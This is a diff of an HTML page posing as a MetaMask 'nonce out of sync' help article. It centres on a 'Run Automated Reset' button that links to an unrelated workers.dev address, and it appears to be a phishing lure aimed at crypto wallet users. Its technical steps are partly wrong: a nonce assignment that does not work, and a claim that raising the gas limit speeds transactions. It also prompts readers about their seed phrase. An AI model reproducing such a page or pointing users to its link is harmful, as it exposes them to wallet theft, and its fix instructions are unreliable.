@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: -apple-system;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,29 +41,32 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message "MetaMask nonce out of sync" when attempting to send a transaction on the Ethereum network, indicating a discrepancy between the expected and actual nonce values.</li>
+<li>The user encounters a "Nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum (ETH) network, indicating that the transaction nonce (a sequential number assigned to each transaction) is not aligned with the expected value on the blockchain.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the account nonce stored in MetaMask and the actual nonce on the Ethereum blockchain, often resulting from concurrent transactions or wallet resets.</li>
+<li>This error occurs due to a mismatch between the local transaction count in MetaMask and the actual transaction count on the Ethereum blockchain, often resulting from transactions being sent from another wallet or interface using the same account.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account nonce in MetaMask to match the on-chain value:</li>
-<li>Update the MetaMask settings to reflect the correct nonce</li>
-<li>Use the Ethereum blockchain explorer to verify the correct nonce value</li>
-<li>Utilize the following code to reset the nonce:</li>
+<li>Reset the account in MetaMask to resynchronize the nonce:</li>
+<li>Increase the gas limit to ensure the transaction is processed quickly</li>
+<li>Use the <code>eth_getTransactionCount</code> RPC method to fetch the current transaction count</li>
+<li>Update the MetaMask extension settings with the correct nonce value, as shown in the following code block:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth.accounts<span class="o">[</span><span class="m">0</span><span class="o">]</span>.nonce<span class="w"> </span><span class="o">=</span><span class="w"> </span>eth.getTransactionCount<span class="o">(</span>eth.accounts<span class="o">[</span><span class="m">0</span><span class="o">])</span>
+<div class="codehilite"><pre><span></span><code><span class="o">{</span>
+<span class="w">  </span><span class="s2">&quot;jsonrpc&quot;</span>:<span class="w"> </span><span class="s2">&quot;2.0&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;method&quot;</span>:<span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;params&quot;</span>:<span class="w"> </span><span class="o">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="o">]</span>,
+<span class="w">  </span><span class="s2">&quot;id&quot;</span>:<span class="w"> </span><span class="m">1</span>
+<span class="o">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex transactions.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>MetaMask extension installed and configured</li>
-<li>Ethereum wallet with a sufficient balance</li>
-<li>Access to the Ethereum blockchain explorer (e.g., Etherscan)</li>
-</ul>
+<p>You may need to consult an external console for further debugging.
+Prerequisites:
+* Ensure MetaMask is updated to the latest version
+* Have a backup of your wallet seed phrase
+* Understand the basics of Ethereum transaction management</p>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
